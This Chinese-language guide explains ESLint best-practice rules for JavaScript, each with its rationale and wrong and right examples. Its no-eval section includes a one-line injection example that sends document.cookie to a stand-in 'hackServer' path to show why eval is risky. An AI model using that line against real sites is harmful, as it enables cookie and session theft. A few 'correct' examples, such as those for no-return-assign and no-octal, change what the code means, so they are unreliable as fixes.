# 最佳实践

## 目录

1. [array-callback-return](#array-callback-return)
2. [class-methods-use-this](#class-methods-use-this)
3. [consistent-return](#consistent-return)
4. [default-case](#default-case)
5. [dot-notation](#dot-notation)
6. [eqeqeq](#eqeqeq)
7. [no-alert](#no-alert)
8. [no-caller](#no-caller)
9. [no-case-declarations](#no-case-declarations)
10. [no-empty-function](#no-empty-function)
11. [no-empty-pattern](#no-empty-pattern)
12. [no-eval](#no-eval)
13. [no-extend-native](#no-extend-native)
14. [no-extra-bind](#no-extra-bind)
15. [no-fallthrough](#no-fallthrough)
16. [no-global-assign](#no-global-assign)
17. [no-implied-eval](#no-implied-eval)
18. [no-iterator](#no-iterator)
19. [no-labels](#no-labels)
20. [no-lone-blocks](#no-lone-blocks)
21. [no-loop-func](#no-loop-func)
22. [no-multi-str](#no-multi-str)
23. [no-new](#no-new)
24. [no-new-func](#no-new-func)
25. [no-new-wrappers](#no-new-wrappers)
26. [no-octal](#no-octal)
27. [no-octal-escape](#no-octal-escape)
28. [no-param-reassign](#no-param-reassign)
29. [no-proto](#no-proto)
30. [no-redeclare](#no-redeclare)
31. [no-restricted-properties](#no-restricted-properties)
32. [no-return-assign](#no-return-assign)
33. [no-return-await](#no-return-await)
34. [no-script-url](#no-script-url)
35. [no-self-assign](#no-self-assign)
36. [no-self-compare](#no-self-compare)
37. [no-sequences](#no-sequences)
38. [no-throw-literal](#no-throw-literal)
39. [no-unused-expressions](#no-unused-expressions)
40. [no-useless-concat](#no-useless-concat)
41. [no-useless-escape](#no-useless-escape)
42. [no-useless-return](#no-useless-return)
43. [no-void](#no-void)
44. [no-with](#no-with)
45. [prefer-promise-reject-errors](#prefer-promise-reject-errors)
46. [radix](#radix)
47. [yoda](#yoda)

<a id='array-callback-return'></a>
## array-callback-return

- 规则含义

  数组内置方法中需要返回值的回调函数必须包含return  
  允许return后不跟随值语法(allowImplicit: true)

- 规则原因

  统一规范,防止map等函数忘了写return而导致的问题,  
  如果只是想遍历不需要返回值的话,使用`forEach`方法.

- 错误例子

      list.map(e => console.log(e));

- 正确例子

      list.map(e => e + 'abc');

[eslint](https://eslint.org/docs/rules/array-callback-return)

**[⬆ 回到目录](#目录)**

<a id='class-methods-use-this'></a>
## class-methods-use-this

- 规则含义

  类中的方法必须使用this  
  或者把它变成static函数或提取出模块

- 规则原因

  让你精简类,把和实例不关联的方法移出类(提取出模块等)  
  另一种相反的观点是：我需要在类中提供一些公共帮助方法,供  
  多个类方法使用.而且继承的时候可以更好的重用.

- 错误例子

      class A {  
        method() { console.log('method')}  
      }

- 正确例子

      class A {  
        static method() { console.log('method')}  
        methodB() {console.log(this.name)}  
      }

[eslint](https://eslint.org/docs/rules/class-methods-use-this)

**[⬆ 回到目录](#目录)**

<a id='consistent-return'></a>
## consistent-return

- 规则含义

  函数的return语句统一形式：如果有`return`语句,那么要求每一个分支出口都有`return`语句  
  且每个return语句的形式统一成两者之一：`return value`或者`return`  
  忽略首字母大写的函数(这种函数认为是类)

- 规则原因

  1. 统一规范return形式,看到return就知道是函数出口,增强可读性  
  2. 防止在写某个条件时候因为忘了写return而导致意外错误

- 错误例子

      // 有出口没有return  
      function a() {  
       if (xx) {  
         return  
       }  
      }  
      // return形式不统一  
      function b() {  
       if (xx) {  
         return  
       }  
       return true;  
      }

- 正确例子

      function b() {  
       if (xx) {  
         return true  
       }  
       return false;  
      }  
      // 首字母大写,是类,忽略  
      function Foo() {  
        // 安全构造函数,防止不使用new直接调用Foo时候this指向错误  
        if (!(this instanceof Foo)) {  
          return new Foo();  
        }  
        this.a = 0;  
      }

[eslint](https://eslint.org/docs/rules/consistent-return)

**[⬆ 回到目录](#目录)**

<a id='default-case'></a>
## default-case

- 规则含义

  switch语句强制要求default块  
  如果没有default行为,加上注释`//no default`跳过规则

- 规则原因

  通过明确要求写default语句,让开发人员意识到,  
  是不是应该有默认行为而自己忘了写

- 错误例子

      switch (a) {  
       case 1:  
          break;  
      }

- 正确例子

      switch (a) {  
       case 1:  
          break;  
       default:  
          somecode;  
          break;  
      }  
      // 注释明确告诉没有default  
      switch (a) {  
       case 1:  
          break;  
       // no default  
      }

[eslint](https://eslint.org/docs/rules/default-case)

**[⬆ 回到目录](#目录)**

<a id='dot-notation'></a>
## dot-notation

- 规则含义

  直接访问对象属性(属性名无需动态表示)时必须使用`.`来访问

- 规则原因

  更易阅读,更简洁

- 错误例子

      obj['name']

- 正确例子

      obj.name

[eslint](https://eslint.org/docs/rules/dot-notation)

**[⬆ 回到目录](#目录)**

<a id='eqeqeq'></a>
## eqeqeq

- 规则含义

  强制使用 === 和 !== 比较值是否相等

- 规则原因

  == 和 !==会对不同类型进行转换后比较,  
  防止意外转换造成的错误.  
  转换规则https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness#Loose_equality_using  
  ==的比较规则：  
  * 同类型  
   执行 ===  
   NaN和自己不相等  
  * 不同类型  
   null == undefined  
   原始类型往number转换然后比较  
   对象类型通过toString成原始类型然后比较

- 错误例子

      if (a == b) {}

- 正确例子

      if (a === b) {}

[eslint](https://eslint.org/docs/rules/eqeqeq)

**[⬆ 回到目录](#目录)**

<a id='no-alert'></a>
## no-alert

- 规则含义

  不允许使用`alert`,`confirm`和`prompt`

- 规则原因

  这几个ui不好看,而且会阻塞js进程

- 错误例子

      alert('abcd')

- 正确例子

      customAlert('abcd')

[eslint](https://eslint.org/docs/rules/no-alert)

**[⬆ 回到目录](#目录)**

<a id='no-caller'></a>
## no-caller

- 规则含义

  不允许使用arguments.caller 或 arguments.callee

- 规则原因

  会导致部分情况下代码无法被引擎优化  
  以后版本会被被es规范弃用

[eslint](https://eslint.org/docs/rules/no-caller)

**[⬆ 回到目录](#目录)**

<a id='no-case-declarations'></a>
## no-case-declarations

- 规则含义

  不允许在switch语句中使用变量声明语句(const,let,function,class)  
  如果使用的话,用{}包含case中的代码块

- 规则原因

  const,let,class,function公用一个作用域.可能导致意外的错误

- 错误例子

       switch (1) {  
         case 0:  
           const x = 1234;  
           break;  
         case 1:  
           const x = 1234;  
           break;  
      }  
       switch (1) {  
         case 0:  
           function y() {}  
           break;  
         case 1:  
           y();  
           break;  
      }

- 正确例子

       switch (1) {  
         case 0: {  
           const x = 1234;  
           break;  
         }  
         case 1: {  
           const x = 1234;  
           break;  
         }  
      }

[eslint](https://eslint.org/docs/rules/no-case-declarations)

**[⬆ 回到目录](#目录)**

<a id='no-empty-function'></a>
## no-empty-function

- 规则含义

  禁止定义没有执行语句的空函数  
  允许箭头函数是空函数

- 规则原因

  空函数增加读代码的成本：需要猜测写的人是有什么特殊含义还是写错了

- 错误例子

      function foo() {}

- 正确例子

      function foo() {  
       // 默认函数防止报错  
      }  
      const foo = () => {}

[eslint](https://eslint.org/docs/rules/no-empty-function)

**[⬆ 回到目录](#目录)**

<a id='no-empty-pattern'></a>
## no-empty-pattern

- 规则含义

  不允许出现空解构

- 错误例子

      const {a: {}} = foo;

[eslint](https://eslint.org/docs/rules/no-empty-pattern)

**[⬆ 回到目录](#目录)**

<a id='no-eval'></a>
## no-eval

- 规则含义

  不允许使用eval

- 规则原因

  1. eval的字符串有js注入的风险：比如让用户输入四则运算eval('3 + 4'),但是黑客输入js代码:eval('window.location = /hackServer?cookie=document.cookie')  
  2. 无法debug eval中的代码

[eslint](https://eslint.org/docs/rules/no-eval)

**[⬆ 回到目录](#目录)**

<a id='no-extend-native'></a>
## no-extend-native

- 规则含义

  禁止拓展原生对象

- 规则原因

  防止有人改变原生的方法,而其他人不知道,导致错误使用

- 错误例子

      Object.prototype.a = "a";  
      Array.prototype.a = "a";

[eslint](https://eslint.org/docs/rules/no-extend-native)

**[⬆ 回到目录](#目录)**

<a id='no-extra-bind'></a>
## no-extra-bind

- 规则含义

  禁止无效bind(无this,箭头函数,函数体是自执行语句)

- 规则原因

  箭头函数this无法改变  
  无this函数不要用bind  
  自执行函数的this无法绑定

[eslint](https://eslint.org/docs/rules/no-extra-bind)

**[⬆ 回到目录](#目录)**

<a id='no-fallthrough'></a>
## no-fallthrough

- 规则含义

  switch中每个case必须有对应break

- 规则原因

  防止因为忘记写break导致额外执行了其他case代码段

- 错误例子

      case 1:  
       dosomething();  
      case 2:  
       dosomething();

- 正确例子

      case 1:  
       dosomething();  
       break;  
      case 2:  
       dosomething();  
       break;

[eslint](https://eslint.org/docs/rules/no-fallthrough)

**[⬆ 回到目录](#目录)**

<a id='no-global-assign'></a>
## no-global-assign

- 规则含义

  禁止重新分配全局对象

[eslint](https://eslint.org/docs/rules/no-global-assign)

**[⬆ 回到目录](#目录)**

<a id='no-implied-eval'></a>
## no-implied-eval

- 规则含义

  不允settimeout传递字符串

- 规则原因

  理由同no-eval

- 错误例子

      setTimeout("alert('Hi!');", 100);

- 正确例子

      setTimeout(function() {  
          alert("Hi!");  
      }, 100);

[eslint](https://eslint.org/docs/rules/no-implied-eval)

**[⬆ 回到目录](#目录)**

<a id='no-iterator'></a>
## no-iterator

- 规则含义

  不允许使用 `__iterator__`属性

- 规则原因

  这个属性是SpiderMonkey拓展所使用的预留属性

[eslint](https://eslint.org/docs/rules/no-iterator)

**[⬆ 回到目录](#目录)**

<a id='no-labels'></a>
## no-labels

- 规则含义

  不允许在switch和循环中使用label语法

- 规则原因

  label是弃用语法

[eslint](https://eslint.org/docs/rules/no-labels)

**[⬆ 回到目录](#目录)**

<a id='no-lone-blocks'></a>
## no-lone-blocks

- 规则含义

  禁止出现冗余的`{}`

- 规则原因

  消除混淆

[eslint](https://eslint.org/docs/rules/no-lone-blocks)

**[⬆ 回到目录](#目录)**

<a id='no-loop-func'></a>
## no-loop-func

- 规则含义

  不允许在循环中创建函数

- 规则原因

  创建函数就是创建闭包,防止错误引用变量或造成内存溢出

- 错误例子

      // 共享上下文环境,都输出10  
      for (var i = 0; i < 10; i++) {  
         funcs[i] = function() {  
             return i;  
         };

- 正确例子

      var a = function() {};  
      for (var i=10; i; i--) {  
          a();  
      }  
      函数没有记住外层的变量引用  
      for (var i=10; i; i--) {  
          var a = function() {};  
          a();  
      }  
      // 可以,引用的是块作用域变量  
      for (let i=10; i; i--) {  
          var a = function() { return i; };  
          a();  
      }  
      // 可以,函数保存的引用是外层不变的变量  
      var foo = 100;  
      for (let i=10; i; i--) {  
          var a = function() { return foo; };  
          a();  
      }

[eslint](https://eslint.org/docs/rules/no-loop-func)

**[⬆ 回到目录](#目录)**

<a id='no-multi-str'></a>
## no-multi-str

- 规则含义

  禁止在字符串变量中使用`\回车`的方法来书写多行字符串

[eslint](https://eslint.org/docs/rules/no-multi-str)

**[⬆ 回到目录](#目录)**

<a id='no-new'></a>
## no-new

- 规则含义

  禁止使用new创建对象后不给对象设置对应变量

- 规则原因

  new 操作符做了很多操作：  
  1. 创建一个新对象  
  2. 让构造函数的this指向新对象  
  3. 执行函数  
  4. 返回对象  
  如果你仅仅是为了执行构造函数,不要使用new操作符

- 错误例子

      new Func()

- 正确例子

      const obj = new Func()

[eslint](https://eslint.org/docs/rules/no-new)

**[⬆ 回到目录](#目录)**

<a id='no-new-func'></a>
## no-new-func

- 规则含义

  禁止使用new创建函数

- 规则原因

  理由同no-eval

- 错误例子

      var x = new Function("a", "b", "return a + b");

- 正确例子

      var x = function (a, b) {  
          return a + b;  
      };

[eslint](https://eslint.org/docs/rules/no-new-func)

**[⬆ 回到目录](#目录)**

<a id='no-new-wrappers'></a>
## no-new-wrappers

- 规则含义

  禁止`new 包装器对象`

- 规则原因

  - 什么是包装器对象  
    'abc' 134 true 都是原始类型,但是我们可以调用它们的方法：  
    'abc'.toString() 134.toString() true.toString()是为什么？每次使用方法时,  
    通过new String,Boolean,Number临时创建一个对象,继承类方法.使用完方法后,再回复成原始  
    类型.  
  - 使用有什么问题  
      1. 使用包装器对象返回的是对象,不是原始类型  
          const str = new String('str'); typeof str //'object'  
      2. 使用包装器对象创建bool值,永远是true  
          if (new Boolean(fasle)) { //执行}  
  - 把包装器对象作为函数  
      类型转换,返回原始类型

- 错误例子

      const str = new String('abc')

- 正确例子

      const str = 'abcd';  
      const str = String(1234)

[eslint](https://eslint.org/docs/rules/no-new-wrappers)

**[⬆ 回到目录](#目录)**

<a id='no-octal'></a>
## no-octal

- 规则含义

  禁止数字写成以0开头形式

- 规则原因

  会被转换成8进制

- 错误例子

      // 57  
      var num = 071;  
      // 61  
      var result = 5 + 070;

- 正确例子

      var num = '071'

[eslint](https://eslint.org/docs/rules/no-octal)

**[⬆ 回到目录](#目录)**

<a id='no-octal-escape'></a>
## no-octal-escape

- 规则含义

  禁止使用字符串中的八进制转义

- 规则原因

  js中预设这种转义码/[0-7][0-7][0-7]对应了字符串  
  统一使用/u形式的unicode码

- 错误例子

      var foo = 'Copyright \251';

- 正确例子

      // unicode  
      var foo = "Copyright \u00A9";

[eslint](https://eslint.org/docs/rules/no-octal-escape)

**[⬆ 回到目录](#目录)**

<a id='no-param-reassign'></a>
## no-param-reassign

- 规则含义

  禁止改变函数参数引用或改变参数内部属性

- 规则原因

  1. 有可能突变外部对象  
  const obj = {a:1}  
  function b (args) {  
   args.a += 1;  
  }  
  // obj值改变  
  b(obj)  
  2. 突变arguments对象  
  function b(args) {  
   console.log(arguments[0]);  
   // 意外修改了args  
   args = 'dsff';  
   console.log(arguments[0]);  
  }

- 错误例子

      function foo(bar) {bar = 13}  
      function foo(bar) {bar.value = 13}

- 正确例子

      function foo(bar) {const baz = bar}

[eslint](https://eslint.org/docs/rules/no-param-reassign)

**[⬆ 回到目录](#目录)**

<a id='no-proto'></a>
## no-proto

- 规则含义

  禁止使用__proto__属性

- 规则原因

  js保留属性,表示指向对象的原型对象

[eslint](https://eslint.org/docs/rules/no-proto)

**[⬆ 回到目录](#目录)**

<a id='no-redeclare'></a>
## no-redeclare

- 规则含义

  禁止重复声明变量

[eslint](https://eslint.org/docs/rules/no-redeclare)

**[⬆ 回到目录](#目录)**

<a id='no-restricted-properties'></a>
## no-restricted-properties

- 规则含义

  禁止使用特定对象的特定属性  
  1. 禁止使用arguments.callee  
  2. 禁止使用全局对象(global,self,window)的isFinite,(使用Number.isFinite,因为全局的isFinite会把非数字转换成后判断)  
  3. 禁止使用全局对象(同上)的isNaN,(请使用Number.isNaN,因为全局的isFinite会转换成数字后判断)  
  4. 禁止使用对象的__defineGetter__和__defineSetter__方法,使用Object.definePropery代替  
  5. 禁止使用Math.pow.幂运算,使用**代替

[eslint](https://eslint.org/docs/rules/no-restricted-properties)

**[⬆ 回到目录](#目录)**

<a id='no-return-assign'></a>
## no-return-assign

- 规则含义

  禁止在return 语句中进行赋值

- 规则原因

  这种语法容易造成混淆：  
  function doSome() {  
   return foo = bar + 2;  
  }  
  是不是想写return foo === bar + 2,少写=造成的意外呢？

- 错误例子

      function doSome() {  
       return foo = bar + 2;  
      }

- 正确例子

      function doSome() {  
       return foo === bar + 2;  
      }

[eslint](https://eslint.org/docs/rules/no-return-assign)

**[⬆ 回到目录](#目录)**

<a id='no-return-await'></a>
## no-return-await

- 规则含义

  禁止在return中使用await语法

- 规则原因

  冗余的写法  
  处理async返回值和await处理参数的方式都是一样的.

[eslint](https://eslint.org/docs/rules/no-return-await)

**[⬆ 回到目录](#目录)**

<a id='no-script-url'></a>
## no-script-url

- 规则含义

  禁止在url中使用JavaScript脚本

- 规则原因

  同no-eval

- 错误例子

      location.href = "javascript:void(0)";

[eslint](https://eslint.org/docs/rules/no-script-url)

**[⬆ 回到目录](#目录)**

<a id='no-self-assign'></a>
## no-self-assign

- 规则含义

  禁止自我分配

- 规则原因

  无效,一般是拼写错误

- 错误例子

      foo = foo;

[eslint](https://eslint.org/docs/rules/no-self-assign)

**[⬆ 回到目录](#目录)**

<a id='no-self-compare'></a>
## no-self-compare

- 规则含义

  禁止自己比较

- 规则原因

  无效,一般是拼写错误

- 错误例子

      self !== self

[eslint](https://eslint.org/docs/rules/no-self-compare)

**[⬆ 回到目录](#目录)**

<a id='no-sequences'></a>
## no-sequences

- 规则含义

  禁止使用逗号运算符

- 规则原因

  造成意外错误

[eslint](https://eslint.org/docs/rules/no-sequences)

**[⬆ 回到目录](#目录)**

<a id='no-throw-literal'></a>
## no-throw-literal

- 规则含义

  throw只允许throw error对象

[eslint](https://eslint.org/docs/rules/no-throw-literal)

**[⬆ 回到目录](#目录)**

<a id='no-unused-expressions'></a>
## no-unused-expressions

- 规则含义

  禁止未使用的表达式

[eslint](https://eslint.org/docs/rules/no-unused-expressions)

**[⬆ 回到目录](#目录)**

<a id='no-useless-concat'></a>
## no-useless-concat

- 规则含义

  禁止无效的字符串连接('a' + 'b' => 'ab')

[eslint](https://eslint.org/docs/rules/no-useless-concat)

**[⬆ 回到目录](#目录)**

<a id='no-useless-escape'></a>
## no-useless-escape

- 规则含义

  禁止出现无效的转义符号('a\b')

[eslint](https://eslint.org/docs/rules/no-useless-escape)

**[⬆ 回到目录](#目录)**

<a id='no-useless-return'></a>
## no-useless-return

- 规则含义

  禁止出现冗余return(在出口处return并且没有跟随值)

- 错误例子

      function t() {  
       doSome()  
       return  
      }

- 正确例子

      function t() {  
       return doSome()  
      }

[eslint](https://eslint.org/docs/rules/no-useless-return)

**[⬆ 回到目录](#目录)**

<a id='no-void'></a>
## no-void

- 规则含义

  禁止使用void运算符

- 规则原因

  void语法：执行void后面表达式,返回return  
  执行void后面表达式有可能会产生副作用.  
  let a = 1;  
  console.log(void (a = 2));  
  console.log(a);

[eslint](https://eslint.org/docs/rules/no-void)

**[⬆ 回到目录](#目录)**

<a id='no-with'></a>
## no-with

- 规则含义

  禁止使用with语法

- 规则原因

  将对象的成员添加到当前作用域,可能出现问题

[eslint](https://eslint.org/docs/rules/no-with)

**[⬆ 回到目录](#目录)**

<a id='prefer-promise-reject-errors'></a>
## prefer-promise-reject-errors

- 规则含义

  promise reject的参数必须使用error对象或自定义对象

[eslint](https://eslint.org/docs/rules/prefer-promise-reject-errors)

**[⬆ 回到目录](#目录)**

<a id='radix'></a>
## radix

- 规则含义

  parseInt函数必须提供第二个参数-进制基数

- 规则原因

  因为parseInt会根据输入自动检测是属于哪个进制,这可能会造成  
  和意图不符合的意外错误,比如：  
  var num = parseInt("071");      // 57  
  var num = parseInt("071", 10);  // 71

- 错误例子

      var num = parseInt("071");      // 57

- 正确例子

      var num = parseInt("071", 10);  // 71

[eslint](https://eslint.org/docs/rules/radix)

**[⬆ 回到目录](#目录)**

<a id='yoda'></a>
## yoda

- 规则含义

  要求条件判断语句中先出现变量,后出现常量

- 规则原因

  增强可读性,比如if (color === 'red')可理解为如果颜色是红色的

- 错误例子

      if ('red' === color)

- 正确例子

      if ( color === 'red')

[eslint](https://eslint.org/docs/rules/yoda)

**[⬆ 回到目录](#目录)**

